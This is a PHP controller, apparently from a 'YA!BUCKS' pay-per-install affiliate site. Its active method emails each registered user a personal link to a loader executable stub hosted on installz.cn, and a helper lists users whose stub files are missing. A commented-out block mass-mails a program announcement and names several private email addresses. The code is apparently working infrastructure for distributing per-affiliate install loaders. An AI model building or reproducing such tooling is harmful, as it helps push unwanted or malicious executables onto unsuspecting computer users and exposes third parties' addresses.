<?php
//---------------------- required -------------
require_once '../controller/boot.php';
require_once '../controller/Public.php';

//---------------------- libs -----------------
require_once '../lib/Mail/class.phpmailer.php';
//---------------------- models ---------------
require_once '../model/Users.php';
require_once '../model/Payments.php';
require_once '../model/Programs.php';

class Controller extends PublicController {
    private $UsersModel;
    public function __construct(Config $config) {
        parent::__construct($config);
       	$this->UsersModel = new UsersModel($this->getDatabaseAdapter());
    }
    
    public function init(Config $config) {
        parent::init($config);
    }
    
    public function IndexTheme($title, $template, $menu_item) {
        $this->getTemplateAdapter()->put('_MENUITEM', $menu_item);
        return $this->getTemplateAdapter()->render('user/'.$template);
    }
    /*
    public function indexCmd() {
    	
    }
	*/
    
    /*
    public function indexCmd() {
    	$fp = fopen ('users.txt', "r");
    	$str = file_get_contents('users.txt');
    	$arr_users = explode(';', $str);
    	foreach($arr_users as $key=>$value) {
    		$PHPMailer = new PHPMailer();
	        $PHPMailer->ContentType = 'text/html';
	        $PHPMailer->CharSet = 'utf-8';           
	        $PHPMailer->From = 'no-reply@yabucks.com';      
	        $PHPMailer->FromName = 'YA!BUCKS';
	        $PHPMailer->Subject = 'NEW PAY-PER-INSTALL PROGRAM';            
	        $PHPMailer->Body = $this->getTemplateAdapter()->render('emails/start.tpl.php'); 
	        $PHPMailer->AddAddress($value);
	        if($value != 'harroinc@gmail.com' && $value != 'nick_b80v22@yahoo.com' && $value != 'nick_b80v222@yahoo.com')
		        $PHPMailer->Send();   	
    	}
    }
	*/

    
    public function indexCmd() {
    	$users = $this->UsersModel->getUsers(0, 200, $where);
    	foreach ($users as $key=>$value) {
    		$url = substr($value['uid'], 0, 5);
    		$exe = $url.'.exe';
            $this->getTemplateAdapter()->put('loader_url', 
            'http://installz.cn/stubfiles/'.$exe);
    		$PHPMailer = new PHPMailer();
	        $PHPMailer->ContentType = 'text/html';
	        $PHPMailer->CharSet = 'utf-8';           
	        $PHPMailer->From = 'no-reply@yabucks.com';      
	        $PHPMailer->FromName = 'YA!BUCKS';
	        $PHPMailer->Subject = ' CORRECT URL';            
	        $PHPMailer->Body = $this->getTemplateAdapter()->render('emails/start.tpl.php'); 
	        $PHPMailer->AddAddress($value['email']);
	        $PHPMailer->Send();   	
	        
    	}
    }
    
	public function getUsersFilesCmd() {
    	$fp = fopen ('files.txt', "r");
    	$str = file_get_contents('files.txt');
    	$arr_users = explode(';', $str);
    	$where = '';
    	$users = $this->UsersModel->getUsers(0, 200, $where);
    	foreach ($users as $key=>$value) {
    		$url = substr($value['uid'], 0, 5);
    		$exe = $url.'.exe';
    		if(!in_array($exe, $arr_users)){
    			echo $exe.'--'.$value['uid'].'--'.$value['username'].'<br />';
    		}
    	}
    	//print_r($users);
    }
    
}  
//---------------------- required -------------
require_once '../controller/dispatcher/default.php';
?>